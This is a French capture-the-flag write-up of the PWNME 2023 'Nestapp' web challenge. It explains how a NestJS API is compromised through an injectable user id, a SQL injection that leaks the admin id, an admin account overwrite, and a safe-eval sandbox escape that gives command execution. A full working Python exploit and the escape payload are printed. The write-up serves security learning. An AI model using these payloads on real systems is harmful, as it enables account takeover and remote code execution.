---
title: "Nestapp | PWNME CTF 2023"
date: 2023-05-06T12:00:00Z
description: "Voici un writeup complet du dernier challenge web du pwnme ctf"
tags: ["sqli", "rce","escape","sandbox","eval"]
keywords: ["sqli", "rce","escape","sandbox","eval"]
---
[//]: <> (Wrote By Vozec 06/05/2023)
---

# Introduction du challenge :

```
In order to create an API with an auth system, a developer used NestJS. He tried to follows the doc and all the good practices on the official NestJS website, and used libraries that seems safe.

But is it enough ? Your goal is to read the flag, located in /home/flag.txt
```

# Tree Viewer

Les sources de ce challenge sont fournies :
```bash
.
├── Dockerfile
├── front
│   └── index.html
├── nest-cli.json
├── package.json
├── package-lock.json
├── README.md
├── src
│   ├── app.controller.ts
│   ├── app.module.ts
│   ├── app.service.ts
│   ├── auth
│   │   ├── auth.module.ts
│   │   ├── auth.service.ts
│   │   ├── jwt-auth.guard.ts
│   │   └── jwt.strategy.ts
│   ├── main.ts
│   └── users
│       ├── dto
│       │   └── create-user.dto.ts
│       ├── user.entity.ts
│       ├── users.module.ts
│       └── users.service.ts
├── tsconfig.build.json
└── tsconfig.json
```

On a ici une application en TypeScript.
On peut aller voir le fichier ``app.controller.ts``:

```js
@Post('auth/register')
  async register(@Body() payload: CreateUserDTO) {
    const user = await this.authService.create(payload);
    return this.authService.getToken(user);
  }

  @Post('auth/login')
  async login(@Body() payload) {
    const user = await this.authService.validate(payload);
    return this.authService.getToken(user);
  }

  @UseGuards(JwtAuthGuard)
  @Get('infos')
  getProfile(@Request() req) {
    return this.usersService.get(req.user);
  }

  @UseGuards(JwtAuthGuard)
  @Post('exec')
  executeCodeSafely(@Request() req, @Body('code') code: string) {
    if (req.user.pseudo === 'admin')
      try {
        const result = safeEval(code);
        if (!result) throw new CustomError('safeEval Failed');
        return { result };
      } catch (error) {
        return {
          from: error.from ? error.from(AppController) : 'Unknown error source',
          msg: error.message,
        };
      }
    return {
      result: "You're not admin !",
    };
  }
```

On a ici *4* endpoints possibles.
- /auth/register
- /auth/login
- /infos
- /exec

Plus loin dans les sources, on remarque qu'il y a une injection SQL dans la fonction *get*:
```js
async get(user: UserEntity) {
    try {
      // Custom query to rename pseudo into username
      const users = await this.repository.query(
        `SELECT users.pseudo as username, users.id FROM users WHERE users.id = '${user.id}'`,
      );
      return users[0];
    } catch (error) {
      throw new ForbiddenException('Unknow Error');
    }
  }
```

Ainsi, en contrôlant l'id de l'utilisateur, on peut interagir avec la db.

On peut se concentrer sur la fonction qui enregistre un nouvel utilisateur :
```js
async create(payload: CreateUserDTO) {
   try {
     if (await this.usersService.findOne(payload.pseudo))
       throw new ForbiddenException('Pseudo already exists');
     payload.password = getReduceMd5(payload.password);
     return this.usersService.create(payload);
   } catch (error) {
     throw new ForbiddenException(error.message);
   }
 }
```

Il y a une vérification sur l'unicité du pseudo avec la ligne:  
``await this.usersService.findOne(payload.pseudo)`` .  
Puis le mot de passe est passé en md5.
Enfin, la fonction ajoute à ``usersService`` **payload**.

On a ici une première vulnérabilité !
Si on spécifie un *id* dans la requête de register, celui-ci est conservé.

```python
import requests
import random

class exploit:
	def __init__(self,url,session):
		self.url = url
		self.sess = session

	def login(self,user,pwd):
		data = {'pseudo':user,'password':pwd}
		r = self.sess.post('%s/auth/login'%self.url,json=data).json()
		return r['access_token']

	def register(self,user,pwd,id_=''):
		data = {'pseudo':user,'password':pwd}
		if id_:
			data['id']=id_
		r = self.sess.post('%s/auth/register'%self.url,json=data).json()
		if ("statusCode" in r):
			print(r['message'])
			exit()
		return r['access_token']

	def info(self,token):
		return self.sess.get('%s/infos'%self.url,headers={"Authorization":"Bearer %s"%(token)}).json()

exp = exploit(
	url = 'http://13.37.17.31:51665',
	session = requests.session()
)
token = exp.register(
	user = 'vozec',
	pwd  = 'vozec',
	id_  = 'injected_id',
)
print(exp.info(token))
```

*Résultat*:
```bash
{'username': 'vozec', 'id': 'injected_id'}
```

On peut maintenant jeter un œil au schéma de la DB:
```bash
export class UserEntity extends BaseEntity {
  @PrimaryGeneratedColumn('uuid')
  public id: string;

  @Column({ unique: true, length: 32 })
  public pseudo: string;

  @Column({ length: 6 })
  public password: string;
}
```

On peut lancer le challenge en local avec :  
```bash
docker-compose build
docker-compose up
```

Si on se connecte à la base de donné et qu'on inspecte le schéma de la table ``users``:
```bash
describe users;
```

On obtient:  
```
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | varchar(36) | NO   | PRI | NULL    |       |
| pseudo   | varchar(32) | NO   | UNI | NULL    |       |
| password | varchar(6)  | NO   |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
```

On voit ici que ``id`` à une taille maximale de 36 caractères.  
Il va être difficile de faire une injection sql dans ce paramètre pour exfiltrer le mot de passe de l'admin.

En revanche, on remarque que l'id est une **clé primaire**.
Pourtant, il n'y a aucun test d'unicité sur l'id ce qui veut dire que si on crée un utilisateur avec le même id que l'admin, celui va le remplacer de la base de données.

L'idée est la suivante :
- Utiliser la SQLI pour leak l'id de l'admin
- Créer un utilisateur avec cet ID pour supprimer 'admin' des utilisateurs
- Re-créer un utilisateur 'admin' avec un mot de passe à nous.

## Etape 1:
On peut utiliser ce payload:
```bash
' or users.pseudo = 'admin' --
```

La requête forger sera donc:  
```bash
SELECT users.pseudo as username, users.id FROM users WHERE users.id = '' or users.pseudo = 'admin' -- '
```

On peut donc mettre à jour notre exploit :
```python
import random

...

def sqli(self,payload):
		user = ''.join([random.choice('bcdef') for _ in range(15)])
		pwd = user
		token = self.register(
			user = user,
			pwd  = pwd,
			id_ = payload
		)
		return user,pwd,self.info(token)

...
admin_id = exp.sqli(
	payload = "' or users.pseudo = 'admin' -- "
)[-1]
print(admin_id)
```

*Résultat*:  
```bash
{'username': 'admin', 'id': 'da20b92c-efc6-42e0-9490-3d38d8bf3e3a'}
```

## Etape 2 et 3
```python
token = exp.register(
	user = 'random_user',
	pwd  = 'random_pwd',
	id_  =  admin_id['id']
)
token = exp.register(
	user = 'admin',
	pwd  = 'admin_pwd',
)
print(token)
```


*Résultat*:  
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwc2V1ZG8iOiJhZG1pbiIsInN1YiI6ImY1YzA5YmNkLTQ4OWQtNDI4YS1iNThmLTJmZTE2MmZiNjVlNCIsImlhdCI6MTY4MzM3NjEyNSwiZXhwIjoxNjgzMzgzMzI1fQ.IueXEC1xaIIPdwJnJlONIcKBQSLnVIgiV7Ko6skn46Q
```
```bash
$ echo eyJwc2V1ZG8iOiJhZG1pbiIsInN1YiI6ImY1YzA5YmNkLTQ4OWQtNDI4YS1iNThmLTJmZTE2MmZiNjVlNCIsImlhdCI6MTY4MzM3NjEyNSwiZXhwIjoxNjgzMzgzMzI1fQ== | base64 -d
{"pseudo":"admin","sub":"f5c09bcd-489d-428a-b58f-2fe162fb65e4","iat":1683376125,"exp":1683383325}
```


## From admin to RCE.

Maintenant que nous somme admin, nous devons trouver un moyen de RCE à travers la fonction ``safeEval`` utilisé par le endpoint /exec

On peut déjà écrire un code pour exécuter une simple opération:
```python
class exploit:
  ...
  def exec(self,token,cmd):
    r = self.sess.post('%s/exec'%self.url,json={'code':cmd},headers={"Authorization":"Bearer %s"%(token)})
    return r.json()
  ...


res = exp.exec(
	token = token,
	cmd = '5+5'
)
print(res)
```

*Résultat*:  
```bash
{'result': 10}
```

On tombe sur [cette issue github](https://github.com/hacksparrow/safe-eval/issues/27) qui une fois légèrement modifier nous donne une RCE directe sur le système !

```python
class exploit:
  ...
  def rce(self,token,cmd):
    rce = "import('test').catch((e)=>{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('%s')"
    return bytes(self.exec(token,rce%cmd)['result']['data']).decode().strip()

...
res = exp.rce(
	token = token,
	cmd = 'cat /home/flag.txt'
)
```

# Exploit complet:
```python
import requests
import random

class exploit:
	def __init__(self,url,session):
		self.url = url
		self.sess = session

	def login(self,user,pwd):
		data = {'pseudo':user,'password':pwd}
		r = self.sess.post('%s/auth/login'%self.url,json=data).json()
		return r['access_token']

	def register(self,user,pwd,id_=''):
		data = {'pseudo':user,'password':pwd}
		if id_:
			data['id']=id_
		r = self.sess.post('%s/auth/register'%self.url,json=data).json()		
		return r['access_token']

	def info(self,token):
		return self.sess.get('%s/infos'%self.url,headers={"Authorization":"Bearer %s"%(token)}).json()

	def sqli(self,payload):
		user = ''.join([random.choice('bcdef') for _ in range(15)])
		pwd = user
		token = self.register(
			user = user,
			pwd  = pwd,
			id_ = payload
		)
		return user,pwd,self.info(token)

	def exec(self,token,cmd):
		r = self.sess.post('%s/exec'%self.url,json={'code':cmd},headers={"Authorization":"Bearer %s"%(token)})
		return r.json()

	def rce(self,token,cmd):
		rce = "import('test').catch((e)=>{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('%s')"
		return bytes(self.exec(token,rce%cmd)['result']['data']).decode().strip()

exp = exploit(
	url = 'http://13.37.17.31:52005',
	session = requests.session()
)

admin_id = exp.sqli(
	payload = "' or users.pseudo = 'admin' -- "
)[-1]

token = exp.register(
	user = 'random_user',
	pwd  = 'random_pwd',
	id_  =  admin_id['id']
)
token = exp.register(
	user = 'admin',
	pwd  = 'admin_pwd',
)
res = exp.rce(
	token = token,
	cmd = 'cat /home/flag.txt'
)
print(res)
```

Flag: ``PWNME{G0oD_Job!!_5aFe-Ev4l_W4s_n07_V3rY_S4f3_e2}``
